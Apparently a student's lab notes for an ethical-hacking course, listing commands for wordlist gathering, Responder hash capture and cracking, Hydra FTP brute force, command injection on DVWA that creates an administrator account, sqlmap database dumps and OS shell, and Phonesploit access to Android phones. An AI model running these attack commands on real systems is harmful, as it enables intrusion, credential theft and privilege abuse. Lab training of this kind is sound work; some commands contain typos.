Module 2: Footprinting & Reconnaissance

4.7 Gather wordlist from Target website using CeWL

Cewl -d 2 -m 5 www.certifiedhacker.com


	-d - Depth to spider
	-m - Minimum word length

OR

Cewl -w wordlist.txt -d 2 -m 5 www.certifiedhacaker.com

Wordlist gets saved in root directory

Pluma wordlist.txt


Module 6: System Hacking

6.1 Active online attack to crack system password using Responder

Ubuntu

Cd Responder
Chmod +x ./Responder.py
Sudo ./Responder.py -l ens3
	-l specifies the interface

Switch to Windows, login

Switch to Linux
home/responder/logs
Open smb-ntlmv2-ssp-IP address.txt file

Sudo john /home/ubuntu/Responder.logs/[Log File Name.txt]


6.2 Audit System Passwords using L0phtCrack

6.3 Find Vulnerabilities on Exploit Sites
www.exploit-db.com

Module 7 - Malware Threats

7.4 Analysing ELF executable file using Detect It Easy (DIE)

Module 8 - Sniffing

8.2.1. Password Sniffing using Wireshark


Tools -> Credentials


Module 11 - Session Hijacking

Module 13 - Hacking Web Servers
13.2.1 - Crack FTP Credentials using a Dictionary attack

Nmap -p 21
Hydra -L <wordlist> -P <passwords.txt> ftp://IP Address of FTP Server

Module 14 - Hacking Web Applications

14.3 Perform Web Spidering using OWASP ZAP
Cd
Zaproxy
Automated Scan -> 

14.4 Detect Load Balancers using Various Tools

Sudo su
cd
Dig yahoo.com
Lbd yahoo.com

Lab 2: Perform Web Application Attacks

Perform Brute-Force attack using Burp Suite (Intruder)
Perform Parameter Tampering using Burp Suite

Proxy Tab -> Intercept On
Forward until you are logged into the user account
Click View Profile tab from Menu bar
Forward on burpsuite
Click INSPECTOR
Change Query Parameters and intercept Off

Exploit RCE Vulnerability to compromise a target web server
Login to DVWA
Command Injection page
Ping a device -> 

| hostname
| whoami
| tasklist
| Taskkill /PID /F (Eg. |Taskkill /3122 /F )
| dir C:\
| net user
| net user Test /Add
| net user
| net user Test
| net localgroup Administrators Test /Add
| net user Test

8. Exploit a File Upload Vulnerability at  Different Security Levels

Module 15: SQL Injection

15.2 Perform SQLI against MSSQL to extract DBs using sqlmap

After logging in, inspect element, get value of document.cookie

Enumerating Databases:
Sqlmap -u “URL” –cookie=”Cookie value” –dbs

Enumerating tables
Sqlmap -u “URL” –cookie=”Cookie value” -D DBname –tables


Dumping table content

Sqlmap -u “URL” –cookie=”Cookie value” -D DBname -T Tablename –dump

Interactive OS Shell

Sqlmap -u “URL” –cookie=”Cookie value” –os-shell

Module 17 - Hacking Mobile Platforms

17.4 Exploit Android platform through ADB using Phonesploit

Cd Phonesploit
// Python3 -m pip install colorama
Python3 phonesploit.py
3
Entry phone IP address
At main_menu prompt, type 4 (Access shell on a phone)
Pwd
Ls
Cd sdcard

Cd Download
Ls

Module 18 - IoT and OT Hacking

18.1 Capture and Analyze IoT Traffic using Wireshark

Type mqtt under filter field, gather msglen, topic length, topic, message from public message, publish release, publish complete and public received

Module 20 - Cryptography

HashCalc
MD5 Calculator
HashMyFiles
CrytoForge
Advanced Encryption Package
BCTextEncoder

Disk Encryption using
VeraCrypt
Bitlocker drive encryption
Rohos Disk Encryption
Cryptanalysis using
CrypTool (RC2 Encryption/ Decryption and 3DES (ECB) )
RC2 - 8 bit keylength, 05 as hexadecimal chaaaaraacter
Triple Des (ECB) with 128 bits (effectively 112 bits) with combinaations of 12 as hexaadecimal characters.

AlphaPeeler

